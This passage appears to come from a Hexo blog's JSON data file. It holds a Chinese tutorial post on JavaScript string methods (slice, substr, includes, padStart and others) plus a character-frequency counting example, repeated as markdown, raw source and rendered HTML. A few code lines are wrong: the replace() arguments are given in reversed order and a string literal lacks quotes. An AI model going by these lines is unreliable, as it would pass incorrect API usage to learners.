class=\"string\">'redux-thunk'</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> reducer <span class=\"keyword\">from</span> <span class=\"string\">'./reducer'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> createStore(reducer, composeWithDevTools(applyMiddleware(thunk)))</span><br></pre></td></tr></table></figure>\n"},{"title":"字符串常用方法","abbrlink":"47556d42","_content":"\n\n\n# 字符串常用方法\n\n​\t字符串所有的方法，都 **不会修改字符串本身**(字符串是不可变的)，操作完成会 **返回一个新的字符串**。\n\n## ES5及以前的方法\n\n+ 转换为字符串\n\n  ```javascript\n  let age = 10;\n  var ageStr = age.toString('进制') // 可为：2,8,10,16，不填默认为十进制\n  // 注意 null 和 undefined 值没有这个方法\n  \n  String(age)// '10'\n  ```\n\n+ 字符方法——获取字符串中的单个字符\n\n  ```javascript\n  字符串.charAt(index); // 返回索引对应的字符\n  字符串[index];      // 推荐使用\n  ```\n\n+ 字符串操作——拼接 和 截取\n\n  ```javascript\n  // 拼接\n  字符串.concat(str1,str2,str3...);\n  拼接符 +     //推荐使用\n  \n  // 截取\n  字符串.slice(start,end) // 前包后不包\n  // slice() substring() substr() 第一个参数是开始位置，\n  // slice() substring() 但是，第二个参数是结束位置\n  // substr() 第二个参数是 返回的长度\n  let str = abcdefg\n  console.log(str.slice(2,4)); // cd\n  console.log(str.substring(2,4)); // cd\n  console.log(str.substr(2,4)); // cdef\n  ```\n\n+ 字符串位置方法——查询字符是否在字符串中存在\n\n  ```javascript\n  字符串.indexOf(); \n  字符串.lastIndexOf();\n  ```\n\n+ 去除空白符\n\n  ```javascript\n  字符串.trim();  // 去除字符串两边的空格\n  ```\n\n+ 字母字符大小写转换\n\n  ```javascript\n  字符串.toUpperCase(); \t// 转换大写 重点\n  字符串.toLowerCase(); \t// 转换小写 重点\n  ```\n\n+ 字符串替换\n\n  ```javascript\n  字符串.replace(newStr,oldStr);\n  ```\n\n+ 字符串分割\n\n  ```javascript\n  字符串.split(sp);  // 把一个字符串分割成字符串数组。\n  ```\n\n\n\n## ES6+ 新方法\n\n`let str = 'abcdefg'`\n\n+ for···of···字符串的遍历器接口 \n\n  ```javascript\n  // for···of···字符串的遍历器接口\n      for( let codePoint of str) {\n        console.log(codePoint) // 返回字符串的每一个字符\n        console.log(typeof codePoint) // string\n      }\n  ```\n\n+ includes() 、startsWith()、 endsWith() 返回的都是boolean值 \n\n  ```javascript\n  // includes() startsWith() endsWith() 返回的都是boolean值\n  // includes() 表示是否能找到参数\n  // startsWith() 表示参数字符串是否在源字符串开始\n  // endsWith() 表示参数字符串是否在源字符串结尾\n  console.log(str.includes('cd')) // true\n  console.log(str.startsWith('ab')) // true\n  console.log(str.endsWith('fg')) // true\n  ```\n\n+ repeat() 将源字符串复制一遍，返回新的字符串 \n\n  ```javascript\n  // 参数是小数 会被取整，0返回空，Infinity或负数会报错，NaN等同于0\n  console.log(str.repeat(3)) // abcdefgabcdefgabcdefg\n  ```\n\n+ padStart() 、padEnd() 字符串补全 \n\n  ```javascript\n  // 如果某个字符串不够指定长度，会在头部或尾部补全长度\n  console.log(str.padStart(10,'0')) // 000abcdefg\n  console.log(str.padEnd(10,'0')) // abcdefg000 \n  ```\n\n  \n\n## 获取字符串中出现最多的字符和次数\n\n- 将字符串变化一种格式：字符串的每一个字符作为对象的键，字符出现的次数作为值，这就形成一个新的对象。\n- 遍历这个对象，比较每一个键值对的值，取最大的键值对，即得到字符串出现最多的字符和出现的次数。\n\n```js\n  <script>\n    /* 判断一个字符串中出现最多的字符和出现的次数 */\n    var str = 'aabbccddd';\n    var obj = {}; /* 定义一个空的对象来接收结果 */\n    for (var i = 0; i < str.length; i++) {\n      /* charAt获取字符串的索引 */\n      /* 判断obj是否存在一个为 obj[str.charAt(i)] 的键\n         如果不存在，那么就添加这个键，并且赋值为 1 \n         如果已经存在这个键，那么就给这个键的值加1 */\n      if (!obj[str.charAt(i)]) {\n        obj[str.charAt(i)] = 1;\n      } else {\n        obj[str.charAt(i)]++;\n      }\n    }\n    console.log(obj);\n    /* 假设一个为0的值 和 一个空的字符串来存放键\n    for in 遍历obj对象 然后把每一个值和max对比\n    然后获取最大的值max 和 最大值对应的键maxno */\n    var max = 0;\n    var maxno = '';\n    for (var k in obj) {\n      if (obj[k] > max) {\n        max = obj[k];\n        maxno = k;\n      }\n    }\n    console.log(max + ' ' + maxno);\n  </script>\n\n```\n","source":"_posts/字符串常用方法.md","raw":"---\ntitle: 字符串常用方法\ncategories:\n  - JavasCript\ntags:\n  - JavasCript\nabbrlink: 47556d42\n---\n\n\n\n# 字符串常用方法\n\n​\t字符串所有的方法，都 **不会修改字符串本身**(字符串是不可变的)，操作完成会 **返回一个新的字符串**。\n\n## ES5及以前的方法\n\n+ 转换为字符串\n\n  ```javascript\n  let age = 10;\n  var ageStr = age.toString('进制') // 可为：2,8,10,16，不填默认为十进制\n  // 注意 null 和 undefined 值没有这个方法\n  \n  String(age)// '10'\n  ```\n\n+ 字符方法——获取字符串中的单个字符\n\n  ```javascript\n  字符串.charAt(index); // 返回索引对应的字符\n  字符串[index];      // 推荐使用\n  ```\n\n+ 字符串操作——拼接 和 截取\n\n  ```javascript\n  // 拼接\n  字符串.concat(str1,str2,str3...);\n  拼接符 +     //推荐使用\n  \n  // 截取\n  字符串.slice(start,end) // 前包后不包\n  // slice() substring() substr() 第一个参数是开始位置，\n  // slice() substring() 但是，第二个参数是结束位置\n  // substr() 第二个参数是 返回的长度\n  let str = abcdefg\n  console.log(str.slice(2,4)); // cd\n  console.log(str.substring(2,4)); // cd\n  console.log(str.substr(2,4)); // cdef\n  ```\n\n+ 字符串位置方法——查询字符是否在字符串中存在\n\n  ```javascript\n  字符串.indexOf(); \n  字符串.lastIndexOf();\n  ```\n\n+ 去除空白符\n\n  ```javascript\n  字符串.trim();  // 去除字符串两边的空格\n  ```\n\n+ 字母字符大小写转换\n\n  ```javascript\n  字符串.toUpperCase(); \t// 转换大写 重点\n  字符串.toLowerCase(); \t// 转换小写 重点\n  ```\n\n+ 字符串替换\n\n  ```javascript\n  字符串.replace(newStr,oldStr);\n  ```\n\n+ 字符串分割\n\n  ```javascript\n  字符串.split(sp);  // 把一个字符串分割成字符串数组。\n  ```\n\n\n\n## ES6+ 新方法\n\n`let str = 'abcdefg'`\n\n+ for···of···字符串的遍历器接口 \n\n  ```javascript\n  // for···of···字符串的遍历器接口\n      for( let codePoint of str) {\n        console.log(codePoint) // 返回字符串的每一个字符\n        console.log(typeof codePoint) // string\n      }\n  ```\n\n+ includes() 、startsWith()、 endsWith() 返回的都是boolean值 \n\n  ```javascript\n  // includes() startsWith() endsWith() 返回的都是boolean值\n  // includes() 表示是否能找到参数\n  // startsWith() 表示参数字符串是否在源字符串开始\n  // endsWith() 表示参数字符串是否在源字符串结尾\n  console.log(str.includes('cd')) // true\n  console.log(str.startsWith('ab')) // true\n  console.log(str.endsWith('fg')) // true\n  ```\n\n+ repeat() 将源字符串复制一遍，返回新的字符串 \n\n  ```javascript\n  // 参数是小数 会被取整，0返回空，Infinity或负数会报错，NaN等同于0\n  console.log(str.repeat(3)) // abcdefgabcdefgabcdefg\n  ```\n\n+ padStart() 、padEnd() 字符串补全 \n\n  ```javascript\n  // 如果某个字符串不够指定长度，会在头部或尾部补全长度\n  console.log(str.padStart(10,'0')) // 000abcdefg\n  console.log(str.padEnd(10,'0')) // abcdefg000 \n  ```\n\n  \n\n## 获取字符串中出现最多的字符和次数\n\n- 将字符串变化一种格式：字符串的每一个字符作为对象的键，字符出现的次数作为值，这就形成一个新的对象。\n- 遍历这个对象，比较每一个键值对的值，取最大的键值对，即得到字符串出现最多的字符和出现的次数。\n\n```js\n  <script>\n    /* 判断一个字符串中出现最多的字符和出现的次数 */\n    var str = 'aabbccddd';\n    var obj = {}; /* 定义一个空的对象来接收结果 */\n    for (var i = 0; i < str.length; i++) {\n      /* charAt获取字符串的索引 */\n      /* 判断obj是否存在一个为 obj[str.charAt(i)] 的键\n         如果不存在，那么就添加这个键，并且赋值为 1 \n         如果已经存在这个键，那么就给这个键的值加1 */\n      if (!obj[str.charAt(i)]) {\n        obj[str.charAt(i)] = 1;\n      } else {\n        obj[str.charAt(i)]++;\n      }\n    }\n    console.log(obj);\n    /* 假设一个为0的值 和 一个空的字符串来存放键\n    for in 遍历obj对象 然后把每一个值和max对比\n    然后获取最大的值max 和 最大值对应的键maxno */\n    var max = 0;\n    var maxno = '';\n    for (var k in obj) {\n      if (obj[k] > max) {\n        max = obj[k];\n        maxno = k;\n      }\n    }\n    console.log(max + ' ' + maxno);\n  </script>\n\n```\n","slug":"字符串常用方法","published":1,"date":"2020-06-18T07:09:21.438Z","updated":"2020-06-18T07:09:21.438Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckclr4u5r000wqrwttchy73n3","content":"<h1 id=\"字符串常用方法\"><a href=\"#字符串常用方法\" class=\"headerlink\" title=\"字符串常用方法\"></a>字符串常用方法</h1><p>​    字符串所有的方法，都 <strong>不会修改字符串本身</strong>(字符串是不可变的)，操作完成会 <strong>返回一个新的字符串</strong>。</p>\n<h2 id=\"ES5及以前的方法\"><a href=\"#ES5及以前的方法\" class=\"headerlink\" title=\"ES5及以前的方法\"></a>ES5及以前的方法</h2><ul>\n<li><p>转换为字符串</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> age = <span class=\"number\">10</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> ageStr = age.toString(<span class=\"string\">'进制'</span>) <span class=\"comment\">// 可为：2,8,10,16，不填默认为十进制</span></span><br><span class=\"line\"><span class=\"comment\">// 注意 null 和 undefined 值没有这个方法</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">String</span>(age)<span class=\"comment\">// '10'</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>字符方法——获取字符串中的单个字符</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">字符串.charAt(index); <span class=\"comment\">// 返回索引对应的字符</span></span><br><span class=\"line\">字符串[index];      <span class=\"comment\">// 推荐使用</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>字符串操作——拼接 和 截取</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 拼接</span></span><br><span class=\"line\">字符串.concat(str1,str2,str3...);</span><br><span class=\"line\">拼接符 +     <span class=\"comment\">//推荐使用</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 截取</span></span><br><span class=\"line\">字符串.slice(start,end) <span class=\"comment\">// 前包后不包</span></span><br><span class=\"line\"><span class=\"comment\">// slice() substring() substr() 第一个参数是开始位置，</span></span><br><span class=\"line\"><span class=\"comment\">// slice() substring() 但是，第二个参数是结束位置</span></span><br><span class=\"line\"><span class=\"comment\">// substr() 第二个参数是 返回的长度</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> str = abcdefg</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(str.slice(<span class=\"number\">2</span>,<span class=\"number\">4</span>)); <span class=\"comment\">// cd</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(str.substring(<span class=\"number\">2</span>,<span class=\"number\">4</span>)); <span class=\"comment\">// cd</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(str.substr(<span class=\"number\">2</span>,<span class=\"number\">4</span>)); <span class=\"comment\">// cdef</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>字符串位置方法——查询字符是否在字符串中存在</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">字符串.indexOf(); </span><br><span class=\"line\">字符串.lastIndexOf();</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>去除空白符</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">字符串.trim();  <span class=\"comment\">// 去除字符串两边的空格</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>字母字符大小写转换</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">字符串.toUpperCase(); \t<span class=\"comment\">// 转换大写 重点</span></span><br><span class=\"line\">字符串.toLowerCase(); \t<span class=\"comment\">// 转换小写 重点</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>字符串替换</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">字符串.replace(newStr,oldStr);</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>字符串分割</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">字符串.split(sp);  <span class=\"comment\">// 把一个字符串分割成字符串数组。</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h2 id=\"ES6-新方法\"><a href=\"#ES6-新方法\" class=\"headerlink\" title=\"ES6+ 新方法\"></a>ES6+ 新方法</h2><p><code>let str = &#39;abcdefg&#39;</code></p>\n<ul>\n<li><p>for···of···字符串的遍历器接口 </p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// for···of···字符串的遍历器接口</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span>( <span class=\"keyword\">let</span> codePoint <span class=\"keyword\">of</span> str) &#123;</span><br><span class=\"line\">      <span class=\"built_in\">console</span>.log(codePoint) <span class=\"comment\">// 返回字符串的每一个字符</span></span><br><span class=\"line\">      <span class=\"built_in\">console</span>.log(<span class=\"keyword\">typeof</span> codePoint) <span class=\"comment\">// string</span></span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>includes() 、startsWith()、 endsWith() 返回的都是boolean值 </p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// includes() startsWith() endsWith() 返回的都是boolean值</span></span><br><span class=\"line\"><span class=\"comment\">// includes() 表示是否能找到参数</span></span><br><span class=\"line\"><span class=\"comment\">// startsWith() 表示参数字符串是否在源字符串开始</span></span><br><span class=\"line\"><span class=\"comment\">// endsWith() 表示参数字符串是否在源字符串结尾</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(str.includes(<span class=\"string\">'cd'</span>)) <span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(str.startsWith(<span class=\"string\">'ab'</span>)) <span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(str.endsWith(<span class=\"string\">'fg'</span>)) <span class=\"comment\">// true</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>repeat() 将源字符串复制一遍，返回新的字符串 </p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 参数是小数 会被取整，0返回空，Infinity或负数会报错，NaN等同于0</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(str.repeat(<span class=\"number\">3</span>)) <span class=\"comment\">// abcdefgabcdefgabcdefg</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>padStart() 、padEnd() 字符串补全 </p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 如果某个字符串不够指定长度，会在头部或尾部补全长度</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(str.padStart(<span class=\"number\">10</span>,<span class=\"string\">'0'</span>)) <span class=\"comment\">// 000abcdefg</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(str.padEnd(<span class=\"number\">10</span>,<span class=\"string\">'0'</span>)) <span class=\"comment\">// abcdefg000</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h2 id=\"获取字符串中出现最多的字符和次数\"><a href=\"#获取字符串中出现最多的字符和次数\" class=\"headerlink\" title=\"获取字符串中出现最多的字符和次数\"></a>获取字符串中出现最多的字符和次数</h2><ul>\n<li>将字符串变化一种格式：字符串的每一个字符作为对象的键，字符出现的次数作为值，这就形成一个新的对象。</li>\n<li>遍历这个对象，比较每一个键值对的值，取最大的键值对，即得到字符串出现最多的字符和出现的次数。</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">  <span class=\"comment\">/* 判断一个字符串中出现最多的字符和出现的次数 */</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> str = <span class=\"string\">'aabbccddd'</span>;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> obj = &#123;&#125;; <span class=\"comment\">/* 定义一个空的对象来接收结果 */</span></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; str.length; i++) &#123;</span><br><span class=\"line\">    <span class=\"comment\">/* charAt获取字符串的索引 */</span></span><br><span class=\"line\">    <span class=\"comment\">/* 判断obj是否存在一个为 obj[str.charAt(i)] 的键</span></span><br><span class=\"line\"><span class=\"comment\">       如果不存在，那么就添加这个键，并且赋值为 1 </span></span><br><span class=\"line\"><span class=\"comment\">       如果已经存在这个键，那么就给这个键的值加1 */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!obj[str.charAt(i)]) &#123;</span><br><span class=\"line\">      obj[str.charAt(i)] = <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      obj[str.charAt(i)]++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(obj);</span><br><span class=\"line\">  <span class=\"comment\">/* 假设一个为0的值 和 一个空的字符串来存放键</span></span><br><span class=\"line\"><span class=\"comment\">  for in 遍历obj对象 然后把每一个值和max对比</span></span><br><span class=\"line\"><span class=\"comment\">  然后获取最大的值max 和 最大值对应的键maxno */</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> max = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> maxno = <span class=\"string\">''</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> k <span class=\"keyword\">in</span> obj) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (obj[k] &gt; max) &#123;</span><br><span class=\"line\">      max = obj[k];</span><br><span class=\"line\">      maxno = k;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(max + <span class=\"string\">' '</span> + maxno);</span><br><span class=\"line\">&lt;<span class=\"regexp\">/script&gt;</span></span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"字符串常用方法\"><a href=\"#字符串常用方法\" class=\"headerlink\" title=\"字符串常用方法\"></a>字符串常用方法</h1><p>​    字符串所有的方法，都 <strong>不会修改字符串本身</strong>(字符串是不可变的)，操作完成会 <strong>返回一个新的字符串</strong>。</p>\n<h2 id=\"ES5及以前的方法\"><a href=\"#ES5及以前的方法\" class=\"headerlink\" title=\"ES5及以前的方法\"></a>ES5及以前的方法</h2><ul>\n<li><p>转换为字符串</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> age = <span class=\"number\">10</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> ageStr = age.toString(<span class=\"string\">'进制'</span>) <span class=\"comment\">// 可为：2,8,10,16，不填默认为十进制</span></span><br><span class=\"line\"><span class=\"comment\">// 注意 null 和 undefined 值没有这个方法</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">String</span>(age)<span class=\"comment\">// '10'</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>字符方法——获取字符串中的单个字符</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">字符串.charAt(index); <span class=\"comment\">// 返回索引对应的字符</span></span><br><span class=\"line\">字符串[index];      <span class=\"comment\">// 推荐使用</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>字符串操作——拼接 和 截取</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 拼接</span></span><br><span class=\"line\">字符串.concat(str1,str2,str3...);</span><br><span class=\"line\">拼接符 +     <span class=\"comment\">//推荐使用</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 截取</span></span><br><span class=\"line\">字符串.slice(start,end) <span class=\"comment\">// 前包后不包</span></span><br><span class=\"line\"><span class=\"comment\">// slice() substring() substr() 第一个参数是开始位置，</span></span><br><span class=\"line\"><span class=\"comment\">// slice() substring() 但是，第二个参数是结束位置</span></span><br><span class=\"line\"><span class=\"comment\">// substr() 第二个参数是 返回的长度</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> str = abcdefg</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(str.slice(<span class=\"number\">2</span>,<span class=\"number\">4</span>)); <span class=\"comment\">// cd</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(str.substring(<span class=\"number\">2</span>,<span class=\"number\">4</span>)); <span class=\"comment\">// cd</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(str.substr(<span class=\"number\">2</span>,<span class=\"number\">4</span>)); <span class=\"comment\">// cdef</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>字符串位置方法——查询字符是否在字符串中存在</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">字符串.indexOf(); </span><br><span class=\"line\">字符串.lastIndexOf();</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>去除空白符</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">字符串.trim();  <span class=\"comment\">// 去除字符串两边的空格</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>字母字符大小写转换</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">字符串.toUpperCase(); \t<span class=\"comment\">// 转换大写 重点</span></span><br><span class=\"line\">字符串.toLowerCase(); \t<span class=\"comment\">// 转换小写 重点</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>字符串替换</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">字符串.replace(newStr,oldStr);</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>字符串分割</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">字符串.split(sp);  <span class=\"comment\">// 把一个字符串分割成字符串数组。</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h2 id=\"ES6-新方法\"><a href=\"#ES6-新方法\" class=\"headerlink\" title=\"ES6+ 新方法\"></a>ES6+ 新方法</h2><p><code>let str = &#39;abcdefg&#39;</code></p>\n<ul>\n<li><p>for···of···字符串的遍历器接口 </p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// for···of···字符串的遍历器接口</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span>( <span class=\"keyword\">let</span> codePoint <span class=\"keyword\">of</span> str) &#123;</span><br><span class=\"line\">      <span class=\"built_in\">console</span>.log(codePoint) <span class=\"comment\">// 返回字符串的每一个字符</span></span><br><span class=\"line\">      <span class=\"built_in\">console</span>.log(<span class=\"keyword\">typeof</span> codePoint) <span class=\"comment\">// string</span></span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>includes() 、startsWith()、 endsWith() 返回的都是boolean值 </p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// includes() startsWith() endsWith() 返回的都是boolean值</span></span><br><span class=\"line\"><span class=\"comment\">// includes() 表示是否能找到参数</span></span><br><span class=\"line\"><span class=\"comment\">// startsWith() 表示参数字符串是否在源字符串开始</span></span><br><span class=\"line\"><span class=\"comment\">// endsWith() 表示参数字符串是否在源字符串结尾</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(str.includes(<span class=\"string\">'cd'</span>)) <span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(str.startsWith(<span class=\"string\">'ab'</span>)) <span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(str.endsWith(<span class=\"string\">'fg'</span>)) <span class=\"comment\">// true</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>repeat() 将源字符串复制一遍，返回新的字符串 </p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 参数是小数 会被取整，0返回空，Infinity或负数会报错，NaN等同于0</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(str.repeat(<span class=\"number\">3</span>)) <span class=\"comment\">// abcdefgabcdefgabcdefg</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>padStart() 、padEnd() 字符串补全 </p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 如果某个字符串不够指定长度，会在头部或尾部补全长度</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(str.padStart(<span class=\"number\">10</span>,<span class=\"string\">'0'</span>)) <span class=\"comment\">// 000abcdefg</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(str.padEnd(<span class=\"number\">10</span>,<span class=\"string\">'0'</span>)) 